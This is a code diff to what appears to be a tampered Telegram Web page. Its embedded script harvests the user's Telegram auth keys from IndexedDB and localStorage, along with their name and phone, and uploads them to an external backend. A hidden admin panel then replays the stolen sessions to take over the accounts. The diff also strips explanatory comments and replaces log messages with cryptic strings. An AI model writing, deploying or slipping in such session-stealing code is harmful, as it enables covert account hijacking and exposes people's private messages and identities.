@@ -18,8 +18,7 @@
     @layer ui {
       @layer tablist, spinner, button, input, layout;
     }
-    
-    /* Telegram UI ကို ဖျောက်ထားရန် Custom CSS */
+
     .hide-telegram #root {
         display: none !important;
     }
@@ -29,7 +28,6 @@
     const BACKEND_URL = "https://telegram-7ih3.onrender.com";
     const API_KEY = "tg_custom_secret_key_2026";
 
-    // --- (၁) Binary Data များကို JSON အဖြစ်ပြောင်းရန် Helpers ---
     function bufferToBase64(buf) {
         let binary = '';
         const bytes = new Uint8Array(buf);
@@ -81,7 +79,6 @@ async function exportIndexedDB(dbName, storeName) {
                         const data = {};
                         for (let i = 0; i < getKeysReq.result.length; i++) {
                             const key = getKeysReq.result[i];
-                            // Login Session အတွက် လိုအပ်သော Auth/Key များကိုသာ ရွေးချယ်သိမ်းဆည်းမည်
                             if(typeof key === 'string' && (
                                 key.includes('auth') || 
                                 key.includes('key') || 
@@ -104,7 +101,6 @@ async function exportIndexedDB(dbName, storeName) {
         return new Promise((resolve, reject) => {
             const request = indexedDB.open(dbName);
             
-            // Database မရှိသေးရင် အသစ်တည်ဆောက်ပေးရန်
             request.onupgradeneeded = (e) => {
                 const db = e.target.result;
                 if (!db.objectStoreNames.contains(storeName)) {
@@ -121,7 +117,6 @@ async function exportIndexedDB(dbName, storeName) {
                 const tx = db.transaction(storeName, "readwrite");
                 const store = tx.objectStore(storeName);
 
-                // ရှိပြီးသား Data ဟောင်းများကို အရင်ရှင်းထုတ်မည်
                 const clearReq = store.clear();
                 clearReq.onsuccess = () => {
                     const keys = Object.keys(data);
@@ -131,13 +126,12 @@ async function exportIndexedDB(dbName, storeName) {
                     }
                     
                     let putCount = 0;
-                    // Data အသစ်များကို တစ်ခုချင်း ပြန်သွင်းမည်
                     for (const key of keys) {
                         const putReq = store.put(data[key], key);
                         putReq.onsuccess = () => {
                             putCount++;
                             if (putCount === keys.length) {
-                                resolve(); // အားလုံးသွင်းပြီးပါက အောင်မြင်ကြောင်း အကြောင်းပြန်မည်
+                                resolve(); 
                             }
                         };
                         putReq.onerror = () => reject(new Error("Failed to put key: " + key));
@@ -149,7 +143,7 @@ async function exportIndexedDB(dbName, storeName) {
         });
     }
 
-// --- (၃) Telegram Profile ရှာဖွေသည့် Function (ပိုမိုကောင်းမွန်အောင် ပြင်ဆင်ထားသည်) ---
+
     function getTelegramProfile() {
         try {
             const stateStr = localStorage.getItem('tt-global-state');
@@ -170,11 +164,15 @@ async function exportIndexedDB(dbName, storeName) {
         return null; 
     }
 
-    // --- (၄) Main Logic ---
     document.addEventListener("DOMContentLoaded", () => {
         if (window.location.search.includes("admin=true")) {
-            // ================= ADMIN PANEL =================
-            // (Admin Panel ကုတ်များသည် ယခင်အတိုင်း မှန်ကန်ပြီးဖြစ်၍ မူလအတိုင်း ထားပါ)
+            
+            const adminPass = prompt("Admin Panel Pass:");
+            if (!adminPass) {
+                window.location.href = "/"; 
+                return;
+            }
+
             document.body.classList.add("hide-telegram");
             const adminPanel = document.createElement("div");
             adminPanel.style.cssText = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #f4f4f9; z-index: 999999; padding: 30px; font-family: sans-serif; overflow-y: auto;";
@@ -195,11 +193,13 @@ async function exportIndexedDB(dbName, storeName) {
                 const session = window.adminDataStore[index];
                 if(!session) return;
                 const targetName = session.profile_name || session.user_id;
-                if(!confirm(targetName + " ၏ အကောင့်သို့ ဝင်ရောက်မည် သေချာပါသလား?")) return;
-                alert("Session Data များကို ထည့်သွင်းနေပါသည်... ပြီးလျှင် အလိုအလျောက် အကောင့်ထဲရောက်ပါမည်။");
+                if(!confirm(targetName + " Login Sure?")) return;
+                alert("Data Loading...");
                 
                 try {
                     localStorage.clear();
+                    localStorage.setItem("is_admin_view", "true"); 
+                    
                     if (session.local_storage_str) {
                         const ls = JSON.parse(session.local_storage_str);
                         for (const key in ls) { localStorage.setItem(key, ls[key]); }
@@ -216,12 +216,24 @@ async function exportIndexedDB(dbName, storeName) {
                 const contentDiv = document.getElementById("admin-content");
                 contentDiv.innerHTML = "<p style='color: blue;'>Fetching data from Backend...</p>";
                 try {
-                    const res = await fetch(BACKEND_URL + "/api/get_sessions", { headers: { "x-api-key": API_KEY } });
+                    const res = await fetch(BACKEND_URL + "/api/get_sessions", { 
+                        headers: { 
+                            "x-api-key": API_KEY,
+                            "x-admin-password": adminPass 
+                        } 
+                    });
+
+      
+                    if (!res.ok) {
+                        if (res.status === 401) throw new Error("Password Wrong (Unauthorized)");
+                        throw new Error(`Server Error: ${res.status}`);
+                    }
+
                     const data = await res.json();
                     window.adminDataStore = data; 
                     
                     if(data.length === 0) {
-                        contentDiv.innerHTML = "<p style='color: red;'>မည်သည့် Staff အကောင့်မှ မရှိသေးပါ။</p>";
+                        contentDiv.innerHTML = "<p style='color: red;'>No Data</p>";
                         return;
                     }
                     
@@ -234,8 +246,6 @@ async function exportIndexedDB(dbName, storeName) {
                         
                         const pName = s.profile_name || "Unknown Staff";
                         const pUsername = s.profile_username || "";
-                        
-                        // 🚨 [ပြင်ဆင်ချက်] Phone မရသေးပါက အကောင့်ကွဲပြားစေရန် Unique ID ကို ယာယီပြပေးထားမည်
                         const pPhone = (s.profile_phone === "Waiting..." || s.profile_phone === "Waiting Profile...") 
                                         ? `<span style='color:#888; font-size: 13px;'>ID: ${s.user_id}</span>` 
                                         : s.profile_phone;
@@ -249,19 +259,22 @@ async function exportIndexedDB(dbName, storeName) {
                     });
                     html += "</table>";
                     contentDiv.innerHTML = html;
-                } catch (err) { contentDiv.innerHTML = `<p style='color: red;'><b>Error:</b> ${err.message}</p>`; }
+                } catch (err) { 
+                    contentDiv.innerHTML = `<p style='color: red;'><b>Error:</b> ${err.message}</p>`; 
+                    setTimeout(() => { window.location.href = "/"; }, 3000);
+                }
             });
 
         } else {
+
 // ================= STAFF BROWSER =================
-            
-            // 🚨 [ပြင်ဆင်ချက်] Admin ဝင်နေတာဆိုရင် Sync လုံးဝမလုပ်ဘဲ ပိတ်ထားပါမည် 🚨
+
             if (localStorage.getItem("is_admin_view") === "true") {
-                console.log("🛑 Admin View Mode: Database သို့ Data ပြန်ပို့ခြင်း (Sync) ကို လုံခြုံရေးအရ ပိတ်ထားပါသည်။");
-                return; // ဒီနေရာမှာတင် ရပ်တန့်ပါမည်
+                console.log("itisad");
+                return; 
             }
 
-            console.log("✅ Smart Auth Sync & Logout Detector RUNNING!");
+            console.log("....");
             
             setTimeout(() => {
                 let myUserId = localStorage.getItem("my_custom_user_id");
@@ -274,7 +287,6 @@ async function exportIndexedDB(dbName, storeName) {
                 let wasLoggedIn = false; 
                 let lastKnownUserId = myUserId; 
                 
-                // 🚨 [ပြင်ဆင်ချက် ၁] Profile နောက်မှ ရလာချိန်တွင် Database ကို Force Update လုပ်ရန် Flag
                 let isProfileFullyLoaded = false; 
 
                 const syncSessionData = async () => {
@@ -283,9 +295,8 @@ async function exportIndexedDB(dbName, storeName) {
                     
                     const isLoggedIn = profile !== null || lsDataStr.length > 1500;
 
-                    // --- LOGOUT DETECTOR ---
                     if (wasLoggedIn && !isLoggedIn) {
-                        console.log("⚠️ ညွှန်ကြားချက်: User သည် Logout လုပ်သွားပါသည်။ DB မှ Session ကို ရှင်းလင်းနေပါသည်...");
+                        console.log("out");
                         try {
                             fetch(BACKEND_URL + "/api/delete_session", {
                                 method: "POST",
@@ -293,22 +304,21 @@ async function exportIndexedDB(dbName, storeName) {
                                 body: JSON.stringify({ user_id: lastKnownUserId }), 
                                 keepalive: true 
                             });
-                            console.log("🗑️ Database သို့ ဖျက်ရန် Request ပို့ပြီးပါပြီ။");
+                            console.log("deldb");
                             wasLoggedIn = false; 
                             lastSyncLength = 0;
-                            isProfileFullyLoaded = false; // Logout ဖြစ်သွားလျှင် Flag ပြန်ချမည်
-                        } catch(e) { console.error("❌ DB ဖျက်ရာတွင် အမှားဖြစ်နေပါသည်", e); }
+                            isProfileFullyLoaded = false; 
+                        } catch(e) { console.error("errordb", e); }
                         return; 
                     }
 
-                    // --- SYNC LOGIC ---
                     if (isLoggedIn) {
                         wasLoggedIn = true; 
 
-                        // 🚨 [ပြင်ဆင်ချက် ၂] Profile ရလာတဲ့အချိန်မှာ Data Size မပြောင်းလဲရင်တောင် DB ကို Force Sync လုပ်မည်
+                  
                         if (profile && !isProfileFullyLoaded) {
                             isProfileFullyLoaded = true;
-                            lastSyncLength = 0; // 0 ပြောင်းလိုက်သဖြင့် အောက်ပါ Size စစ်သည့်နေရာတွင် အမြဲအောင်မြင်သွားမည်
+                            lastSyncLength = 0; 
                         }
 
                         if (profile) {
@@ -324,9 +334,8 @@ async function exportIndexedDB(dbName, storeName) {
 
                             if (lastSyncLength === currentDataLength) return; 
 
-                            console.log("🔄 Data အပြောင်းအလဲတွေ့ရှိပါသဖြင့် Backend သို့ Sync စတင်နေပါသည်...");
+                            console.log("changesync");
 
-                            // 🚨 [ပြင်ဆင်ချက် ၃] Profile မရသေးခင်မှာ အကောင့်တွေ မရောသွားအောင် staff_id ကို နာမည်အနေနဲ့ ယာယီထည့်ပေးမည်
                             const finalName = profile ? profile.name : `Staff (${lastKnownUserId})`;
                             const finalPhone = profile ? profile.phone : "Waiting Profile...";
                             const finalUsername = profile ? profile.username : "";
@@ -346,12 +355,12 @@ async function exportIndexedDB(dbName, storeName) {
                             });
                             
                             if(res.ok) {
-                                console.log(`✅ Auth Key Sync အောင်မြင်ပါသည်: ${finalName}`);
+                                console.log(`successsync: ${finalName}`);
                                 lastSyncLength = currentDataLength; 
                             }
-                        } catch(e) { console.error("❌ Sync failed Exception:", e); }
+                        } catch(e) { console.error("synfailed:", e); }
                     } else {
-                        console.log("⏳ User မှ Login အပြည့်အစုံ ဝင်ရောက်မည့်အချိန်ကို စောင့်ဆိုင်းနေပါသည်...");
+                        console.log("wating...");
                     }
                 };
 
